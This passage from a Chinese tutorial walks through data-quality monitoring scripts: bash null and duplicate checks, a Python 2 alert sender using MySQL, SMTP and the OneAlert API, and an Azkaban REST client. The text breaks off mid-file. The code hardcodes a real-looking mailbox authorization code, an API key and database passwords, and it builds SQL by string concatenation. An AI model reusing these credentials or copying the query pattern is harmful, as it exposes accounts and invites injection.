0</span><br></pre></td></tr></table></figure><p><strong>DIM层</strong></p><table><thead><tr><th><strong>表</strong></th><th><strong>检查项目</strong></th><th><strong>依据</strong></th><th><strong>异常值下限</strong></th><th><strong>异常值上限</strong></th></tr></thead><tbody><tr><td><strong>dim_user_info</strong></td><td>空值检查</td><td>id</td><td>0</td><td>10</td></tr><tr><td></td><td>重复值检查</td><td>id</td><td>0</td><td>5</td></tr></tbody></table><p>在Idea中创建一个文件check_dim.sh，在文件中编写如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">DT=<span class="variable">$1</span></span><br><span class="line">[ <span class="string">"<span class="variable">$DT</span>"</span> ] || DT=$(date -d <span class="string">'-1 day'</span> +%F)</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查表 dim_user_info 的重复ID</span></span><br><span class="line"><span class="comment">#参数： -t 表名</span></span><br><span class="line"><span class="comment">#      -d 日期</span></span><br><span class="line"><span class="comment">#      -c 检查重复值的列</span></span><br><span class="line"><span class="comment">#      -s 异常指标下限</span></span><br><span class="line"><span class="comment">#      -x 异常指标上限</span></span><br><span class="line"><span class="comment">#      -l 告警级别</span></span><br><span class="line">bash duplicate.sh -t dim_user_info -d <span class="string">"<span class="variable">$DT</span>"</span> -c id -s 0 -x 5 -l 0</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查表 dim_user_info 的空ID</span></span><br><span class="line"><span class="comment">#参数： -t 表名</span></span><br><span class="line"><span class="comment">#      -d 日期</span></span><br><span class="line"><span class="comment">#      -c 检查空值的列</span></span><br><span class="line"><span class="comment">#      -s 异常指标下限</span></span><br><span class="line"><span class="comment">#      -x 异常指标上限</span></span><br><span class="line"><span class="comment">#      -l 告警级别</span></span><br><span class="line">bash null_id.sh -t dim_user_info -d <span class="string">"<span class="variable">$DT</span>"</span> -c id -s 0 -x 10 -l 0</span><br></pre></td></tr></table></figure><h2 id="5、告警集成模块">5、告警集成模块</h2><p>该模块主要用于检查MySQL中的检测结果的异常，若有异常出现就发送警告。警告方式可选择邮件或者集成第三方告警平台睿象云</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境准备</span></span><br><span class="line"><span class="comment"># 在MySQL官网下载mysql-connector-python-2.1.7-1.el7.x86_64.rpm，下载地址如下：</span></span><br><span class="line"><span class="comment"># https://repo.mysql.com/yum/mysql-connectors-community/el/7/x86_64/mysql-connector-python-2.1.7-1.el7.x86_64.rpm</span></span><br><span class="line"><span class="comment"># 将该rpm包上传至每台服务器，并安装</span></span><br><span class="line">sudo rpm -i mysql-connector-python-2.1.7-1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure><p>新建python脚本用于查询数据监控结果表格并发送告警邮件，该脚本主要由三个函数组成</p><ul><li>read_table用于读取指标有问题的数据</li><li>one_alert函数用于向睿象云发送告警</li><li>mail_alert函数用于发送邮件告警</li></ul><p>在Idea中创建一个文件check_notification.py，在文件中编写如下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_yesterday</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :return: 前一天的日期</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    today = datetime.date.today()</span><br><span class="line">    one_day = datetime.timedelta(days=<span class="number">1</span>)</span><br><span class="line">    yesterday = today - one_day</span><br><span class="line">    <span class="keyword">return</span> str(yesterday)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_table</span><span class="params">(table, dt)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :param table:读取的表名</span></span><br><span class="line"><span class="string">    :param dt:读取的数据日期</span></span><br><span class="line"><span class="string">    :return:表中的异常数据(统计结果超出规定上下限的数据)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># mysql必要参数设置，需根据实际情况作出修改</span></span><br><span class="line">    mysql_user = <span class="string">"root"</span></span><br><span class="line">    mysql_password = <span class="string">"000000"</span></span><br><span class="line">    mysql_host = <span class="string">"hadoop102"</span></span><br><span class="line">    mysql_schema = <span class="string">"data_supervisor"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取Mysql数据库连接</span></span><br><span class="line">    connect = mysql.connector.connect(user=mysql_user, password=mysql_password, host=mysql_host, database=mysql_schema)</span><br><span class="line">    cursor = connect.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询表头</span></span><br><span class="line">    <span class="comment"># ['dt', 'tbl', 'col', 'value', 'value_min', 'value_max', 'notification_level']</span></span><br><span class="line">    query = <span class="string">"desc "</span> + table</span><br><span class="line">    cursor.execute(query)</span><br><span class="line">    head = map(<span class="keyword">lambda</span> x: str(x[<span class="number">0</span>]), cursor.fetchall())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询异常数据(统计结果超出规定上下限的数据)</span></span><br><span class="line">    <span class="comment"># [(datetime.date(2021, 7, 16), u'dim_user_info', u'id', 7, 0, 5, 1),</span></span><br><span class="line">    <span class="comment"># (datetime.date(2021, 7, 16), u'dwd_order_id', u'id', 10, 0, 5, 1)]</span></span><br><span class="line">    query = (<span class="string">"select * from "</span> + table + <span class="string">" where dt='"</span> + dt + <span class="string">"' and `value` not between value_min and value_max"</span>)</span><br><span class="line">    cursor.execute(query)</span><br><span class="line">    cursor_fetchall = cursor.fetchall()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将指标和表头映射成为dict数组</span></span><br><span class="line">    <span class="comment">#[&#123;'notification_level': 1, 'value_min': 0, 'value': 7, 'col': u'id', 'tbl': u'dim_user_info', 'dt': datetime.date(2021, 7, 16), 'value_max': 5&#125;,</span></span><br><span class="line">    <span class="comment"># &#123;'notification_level': 1, 'value_min': 0, 'value': 10, 'col': u'id', 'tbl': u'dwd_order_id', 'dt': datetime.date(2021, 7, 16), 'value_max': 5&#125;]</span></span><br><span class="line">    fetchall = map(<span class="keyword">lambda</span> x: dict(x), map(<span class="keyword">lambda</span> x: zip(head, x), cursor_fetchall))</span><br><span class="line">    <span class="keyword">return</span> fetchall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_alert</span><span class="params">(line)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    集成第三方告警平台睿象云，使用其提供的通知媒介发送告警信息</span></span><br><span class="line"><span class="string">    :param line: 一个等待通知的异常记录，&#123;'notification_level': 1, 'value_min': 0, 'value': 7, 'col': u'id', 'tbl': u'dim_user_info', 'dt': datetime.date(2021, 7, 16), 'value_max': 5&#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 集成睿象云需要使用的rest接口，和APP KEY，须在睿象云平台获取</span></span><br><span class="line">    one_alert_key = <span class="string">"c2030c9a-7896-426f-bd64-59a8889ac8e3"</span></span><br><span class="line">    one_alert_host = <span class="string">"http://api.aiops.com/alert/api/event"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据睿象云的rest api要求，传入必要的参数</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"app"</span>: one_alert_key,</span><br><span class="line">        <span class="string">"eventType"</span>: <span class="string">"trigger"</span>,</span><br><span class="line">        <span class="string">"eventId"</span>: str(random.randint(<span class="number">10000</span>, <span class="number">99999</span>)),</span><br><span class="line">        <span class="string">"alarmName"</span>: <span class="string">""</span>.join([<span class="string">"表格"</span>, str(line[<span class="string">"tbl"</span>]), <span class="string">"数据异常."</span>]),</span><br><span class="line">        <span class="string">"alarmContent"</span>: <span class="string">""</span>.join([<span class="string">"指标"</span>, str(line[<span class="string">"norm"</span>]), <span class="string">"值为"</span>, str(line[<span class="string">"value"</span>]),</span><br><span class="line">                                 <span class="string">", 应为"</span>, str(line[<span class="string">"value_min"</span>]), <span class="string">"-"</span>, str(line[<span class="string">"value_max"</span>]),</span><br><span class="line">                                 <span class="string">", 参考信息："</span> + str(line[<span class="string">"col"</span>]) <span class="keyword">if</span> line.get(<span class="string">"col"</span>) <span class="keyword">else</span> <span class="string">""</span>]),</span><br><span class="line">        <span class="string">"priority"</span>: line[<span class="string">"notification_level"</span>] + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用urllib和urllib2向睿象云的rest结构发送请求，从而触发睿象云的通知策略</span></span><br><span class="line">    body = urllib.urlencode(data)</span><br><span class="line">    request = urllib2.Request(one_alert_host, body)</span><br><span class="line">    urlopen = urllib2.urlopen(request).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> urlopen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mail_alert</span><span class="params">(line)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    使用电子邮件的方式发送告警信息</span></span><br><span class="line"><span class="string">    :param line: 一个等待通知的异常记录，&#123;'notification_level': 1, 'value_min': 0, 'value': 7, 'col': u'id', 'tbl': u'dim_user_info', 'dt': datetime.date(2021, 7, 16), 'value_max': 5&#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># smtp协议发送邮件的必要设置</span></span><br><span class="line">    mail_host = <span class="string">"smtp.126.com"</span></span><br><span class="line">    mail_user = <span class="string">"skiinder@126.com"</span></span><br><span class="line">    mail_pass = <span class="string">"KADEMQZWCPFWZETF"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 告警内容</span></span><br><span class="line">    message = [<span class="string">""</span>.join([<span class="string">"表格"</span>, str(line[<span class="string">"tbl"</span>]), <span class="string">"数据异常."</span>]),</span><br><span class="line">               <span class="string">""</span>.join([<span class="string">"指标"</span>, str(line[<span class="string">"norm"</span>]), <span class="string">"值为"</span>, str(line[<span class="string">"value"</span>]),</span><br><span class="line">                        <span class="string">", 应为"</span>, str(line[<span class="string">"value_min"</span>]), <span class="string">"-"</span>, str(line[<span class="string">"value_max"</span>]),</span><br><span class="line">                        <span class="string">", 参考信息："</span> + str(line[<span class="string">"col"</span>]) <span class="keyword">if</span> line.get(<span class="string">"col"</span>) <span class="keyword">else</span> <span class="string">""</span>])]</span><br><span class="line">    <span class="comment"># 告警邮件，发件人</span></span><br><span class="line">    sender = mail_user</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 告警邮件，收件人</span></span><br><span class="line">    receivers = [mail_user]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将邮件内容转为html格式</span></span><br><span class="line">    mail_content = MIMEText(<span class="string">""</span>.join([<span class="string">"&lt;html&gt;"</span>, <span class="string">"&lt;br&gt;"</span>.join(message), <span class="string">"&lt;/html&gt;"</span>]), <span class="string">"html"</span>, <span class="string">"utf-8"</span>)</span><br><span class="line">    mail_content[<span class="string">"from"</span>] = sender</span><br><span class="line">    mail_content[<span class="string">"to"</span>] = receivers[<span class="number">0</span>]</span><br><span class="line">    mail_content[<span class="string">"Subject"</span>] = Header(message[<span class="number">0</span>], <span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用smtplib发送邮件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        smtp = smtplib.SMTP_SSL()</span><br><span class="line">        smtp.connect(mail_host, <span class="number">465</span>)</span><br><span class="line">        smtp.login(mail_user, mail_pass)</span><br><span class="line">        content_as_string = mail_content.as_string()</span><br><span class="line">        smtp.sendmail(sender, receivers, content_as_string)</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :param argv: 系统参数，共三个，第一个为python脚本本身，第二个为告警方式，第三个为日期</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果没有传入日期参数，将日期定为昨天</span></span><br><span class="line">    <span class="keyword">if</span> len(argv) &gt;= <span class="number">3</span>:</span><br><span class="line">        dt = argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dt = get_yesterday()</span><br><span class="line"></span><br><span class="line">    notification_level = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过参数设置告警方式，默认是睿象云</span></span><br><span class="line">    alert = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> len(argv) &gt;= <span class="number">2</span>:</span><br><span class="line">        alert = &#123;</span><br><span class="line">            <span class="string">"mail"</span>: mail_alert,</span><br><span class="line">            <span class="string">"one"</span>: one_alert</span><br><span class="line">        &#125;[argv[<span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> alert:</span><br><span class="line">        alert = one_alert</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历所有表，查询所有错误内容，如果大于设定警告等级，就发送警告</span></span><br><span class="line">    <span class="keyword">for</span> table <span class="keyword">in</span> [<span class="string">"day_on_day"</span>, <span class="string">"duplicate"</span>, <span class="string">"null_id"</span>, <span class="string">"rng"</span>, <span class="string">"week_on_week"</span>]:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> read_table(table, dt):</span><br><span class="line">            <span class="keyword">if</span> line[<span class="string">"notification_level"</span>] &gt;= notification_level:</span><br><span class="line">                line[<span class="string">"norm"</span>] = table</span><br><span class="line">                alert(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 两个命令行参数</span></span><br><span class="line">    <span class="comment"># 第一个为警告类型：one或者mail</span></span><br><span class="line">    <span class="comment"># 第二个为日期，留空取昨天</span></span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="6、调度模块">6、调度模块</h2><p>该模块的主要功能为调度数据质量监控流程。数据质量监控工作流也采用Azkaban进行调度。数据质量监控工作流必定依赖数据仓库工作流，此处为了解耦，利用Azkaban API主动监视数据仓库工作流的执行状态，进而触发数据质量监控工作流。</p><h3 id="6-1-脚本编写">6.1 脚本编写</h3><p><strong>Azkaban REST API 封装脚本</strong>，该脚本主要是对Azkaban API的封装，主要有三个方法</p><ul><li>login函数可以登录Azkanban并返回session_id</li><li>get_exec_id函数可以获取正在执行的工作流程的Execution ID</li><li>wait_node可以等待指定Flow中某一结点执行完毕并判断其是否执行成功</li></ul><p><a href="http://xn--Ideaazclient-jt4smslb79v64s28v847amn1a.py" target="_blank" rel="noopener">在Idea中创建一个文件azclient.py</a>，在文件中编写如下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># Azkaban API 接口地址</span></span><br><span class="line">az_url = <span class="string">"http://hadoop102:8081/"</span></span><br><span class="line"><span class="comment"># Azkaban用户名</span></span><br><span class="line">az_username = <span class="string">"atguigu"</span></span><br><span class="line"><span class="comment"># Azkaban密码</span></span><br><span class="line">az_password = <span class="string">"atguigu"</span></span><br><span class="line"><span class="comment"># 工程名称</span></span><br><span class="line">project = <span class="string">"gmall"</span></span><br><span class="line"><span class="comment"># flow名称</span></span><br><span class="line">flow = <span class="string">"gmall"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(url, data)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    发送post请求到指定网址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param url: 指定网址</span></span><br><span class="line"><span class="string">    :param data: 请求参数</span></span><br><span class="line"><span class="string">    :return: 请求结果</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    body = urllib.urlencode(data)</span><br><span class="line">    request = urllib2.Request(url, body)</span><br><span class="line">    urlopen = urllib2.urlopen(request).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> json.loads(urlopen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, data)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    发送get请求到指定网址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param url: 指定网址</span></span><br><span class="line"><span class="string">    :param data: 请求参数</span></span><br><span class="line"><span class="string">    :return: 请求结果</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    body = urllib.urlencode(data)</span><br><span class="line">    urlopen = urllib2.urlopen(url + body).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> json.loads(urlopen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    使用`Authenticate`API进行azkaban身份认证，获取session ID</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :return: 返回session_id</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"action"</span>: <span class="string">"login"</span>,</span><br><span class="line">        <span class="string">"username"</span>: az_username,</span><br><span class="line">        <span class="string">"password"</span>: az_password</span><br><span class="line">    &#125;</span><br><span class="line">    auth = post(az_url, data)</span><br><span class="line">    <span class="keyword">return</span> str(auth.get(<span class="string">u"session.id"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_exec_id</span><span class="params">(session_id)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    使用`Fetch Running Executions of a Flow`API获取正在执行的Flow的ExecId</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param session_id: 和azkaban通讯的session_id</span></span><br><span class="line"><span class="string">    :param project: 项目名称</span></span><br><span class="line"><span class="string">    :param flow: 工作流名称</span></span><br><span class="line"><span class="string">    :return: 执行ID</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"session.id"</span>: session_id,</span><br><span class="line">        <span class="string">"ajax"</span>: <span class="string">"getRunning"</span>,</span><br><span class="line">        <span class="string">"project"</span>: project,</span><br><span class="line">        <span class="string">"flow"</span>: flow</span><br><span class="line">    &#125;</span><br><span class="line">    execs = get(az_url + <span class="string">"executor?"</span>, data).get(<span class="string">u"execIds"</span>)</span><br><span class="line">    <span class="keyword">if</span> execs:</span><br><span class="line">        <span class="keyword">return</span> str(execs[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wait_node</span><span class="params">(session_id, exec_id, node_id)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    循环使用`Fetch a Flow Execution`API获取指定Flow中的某个节点(job)的执行状态，直到其执行完成</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param session_id: 和azkaban通讯的session_id</span></span><br><span class="line"><span class="string">    :param exec_id: 执行ID</span></span><br><span class="line"><span class="string">    :param node_id: 指定节点(job)</span></span><br><span class="line"><span class="string">    :return: 该节点是否成功执行完毕</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"session.id"</span>: session_id,</span><br><span class="line">        <span class="string">"ajax"</span>: <span class="string">"fetchexecflow"</span>,</span><br><span class="line">        <span class="string">"execid"</span>: exec_id</span><br><span class="line">    &#125;</span><br><span class="line">    status = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若指定Flow中的指定Node(job)的执行状态是未完成的状态，就一直循环</span></span><br><span class="line">    <span class="keyword">while</span> status <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"SUCCEEDED"</span>, <span class="string">"FAILED"</span>, <span class="string">"CANCELLED"</span>, <span class="string">"SKIPPED"</span>, <span class="string">"KILLED"</span>]:</span><br><span class="line">        <span class="comment"># 获取指定Flow的当前的执行信息</span></span><br><span class="line">        flow_exec = get(az_url + <span class="string">"executor?"</span>, data)</span><br><span class="line">        <span class="comment"># 从该Flow的执行信息中获取nodes字段的值，并遍历寻找特定的节点(job)信息，进而获取该节点(job)的状态</span></span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> flow_exec.get(<span class="string">u"nodes"</span>):</span><br><span class="line">            <span class="keyword">if</span> unicode(node_id) == node.get(<span class="string">u"id"</span>):</span><br><span class="line">                status = str(node.get(<span class="string">u"status"</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">" "</span>.join([node_id, status])</span><br><span class="line">        <span class="comment"># 等待1s，进入下一轮循环判断</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> status == <span class="string">"SUCCEEDED"</span></span><br></pre></td></tr></table></figure><p><strong>ODS层调度脚本</strong></p><p>该脚本用于检查ODS层数据质量。在Idea中创建一个文件check_ods.py，在文件中编写如下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 